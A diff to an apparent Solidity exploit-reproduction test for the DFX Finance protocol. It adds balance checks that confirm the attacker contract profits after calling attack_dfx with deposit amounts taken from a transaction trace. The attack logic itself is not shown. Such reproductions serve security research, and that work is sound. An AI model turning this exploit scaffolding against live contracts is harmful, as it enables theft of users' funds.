@@ -56,6 +56,7 @@ contract Exploit_DFXFinance is TestHarness {
         logBalances(address(dfx));
         console.log('Attacker');
         logBalances(address(this));
+        uint256 balanceBefore = address(this).balance;
 
         // Get the amount of USDC required for the attack.
         (/* uint256 curvesInExchange */, uint256[] memory amountPerToken) = dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
@@ -63,6 +64,8 @@ contract Exploit_DFXFinance is TestHarness {
         uint256 amount1 = amountPerToken[1] * 994 / 1000; // From tx trace
 
         attack_dfx(amount0, amount1);
+        uint256 balanceAfter = address(this).balance;
+        assertGe(balanceAfter, balanceBefore);
     }
     function attack_dfx(uint256 amt0, uint256 amt1) internal {
 
